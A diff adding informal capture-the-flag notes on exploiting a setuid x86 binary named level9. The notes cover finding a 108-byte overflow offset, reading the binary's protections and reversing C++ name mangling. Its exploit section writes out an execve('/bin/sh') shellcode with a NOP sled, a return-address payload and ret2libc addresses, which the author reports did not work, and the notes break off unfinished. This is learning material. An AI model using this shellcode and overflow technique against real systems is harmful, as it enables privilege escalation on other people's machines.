@@ -1,0 +1,64 @@
+-- Blackbox --
+When we launch the program nothing happen, weird
+Lets run it with a big input then see if something happen
+`./level9 $(python -c "print 'A'*200")`, we get a segv, ok lets determine the offset
+We can do it manually or with a De bruijn pattern or some sort of cyclic pattern
+Lets generate one locally with `ragg2 -P 200 -r` `r2 -c wopD 200 0 -`
+Send it as arg in ./level9 and `dmesg` to see where the address did segfault
+Then send it as hex in the dummy r2 `wopO 0xSEGVADDR`, the offset is 108
+We can verify this `./level9 $(python -c "print 'A'*108")` doesnt segv, `*109` does
+Ok so we have a buffer that read av[1] somewhere, with no bound check apparently, situated at rbp-104 of its local stack frame prob
+Lets analyse the binary
+
+-- Protection --
+```
+Stripped = false
+relro = no
+aslr = no
+pic = false
+canary = false
+nx = false
+```
+Ok there is nothing, we already know the offset at which the segv happen, we can just do a shellcode injection prob
+
+-- Exploit --
+Lets try blind, since pic and aslr are disabled, store a nop-sled and a shellcode in the stack in an env variable
+`export SHELLCODE=$(python -c "print '\x90'*528 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")`
+gdb->`start; x/5wx $ebp` = 0xbffff5ac `x/100wx $0xbffff5ac`, spot somewhere in the nopslide `0xbffff70c`
+pack it and add it after the padding we previously found = `\x0c\xf7\xff\xbf`, lets run it
+`./level9 $(python -c "print 'A'*108 + '\x0c\xf7\xff\xbf'")
+It doesnt work, lets try a ret2libc `p &system` `p &exit` `find &system, +999999999, "/bin/sh"`
+0xb7d86060, 0xb7d79be0, 0xb7ea7c58, pack it for 32 bit, doesnt work neither, lets analyse the binary
+
+-- Static analysis --
+The binary is a setuid x86 elf32 executable, written in c++, dynamically linked with libstdc++.so.6 and libc.so.6
+`afl` to see which functions are analysable in the binary
+```
+0x0804869a    4     64 sym.__static_initialization_and_destruction_0_int__int_
+0x080484d0    1      6 fcn.080484d0
+0x080484b0    1      6 sym.imp.__cxa_atexit
+0x080486da    1     28 sym._GLOBAL__sub_I_main
+0x0804873a    1     19 method.N.operator_N_
+0x0804874e    1     23 method.N.operator__N_
+0x080486f6    1     23 method.N.N_int_
+0x0804870e    1     44 method.N.setAnnotation_char_
+0x08048520    1      6 sym.imp.strlen
+0x08048510    1      6 sym.imp.memcpy
+0x080485f4    3    166 main
+0x080484f0    1      6 sym.imp._exit
+0x08048530    1      6 sym.imp.operator_new_unsigned_int_
+0x08048500    1      6 sym.imp.std::ios_base::Init::Init__
+```
+We see quite a lot of new thing since this is our first time reversing c++, lets take it step by step and try to recreate the source.cpp
+`iE`, at least there is only the main we need to care about, `s main` `pdf` `pdg` `VV`
+
+-- Name mangling --
+r2 understand right away what are the symbol that the binary has, but in memory they are stored in the plt like any linked function
+And they're loaded the same way, if we look at it from gdb we have weird symbol name like `_Znwj` 
+What does it mean ? because even following the plt after loading is pretty hard to understand if its native c++ object constructor or anything difficult
+Gnu has a tool called c++filt `c++filt _Znwj = operator new(unsigned int)` to demangle c++ symbols, its actually used by the linker from what i understand
+
+All C++ function names are encoded into a low-level assembly label (this process is known as mangling)
+The c++filt program does the inverse mapping: it decodes (demangles) low-level names into user-level names so that the linker can keep these overloaded functions from clashing
+
+-- --
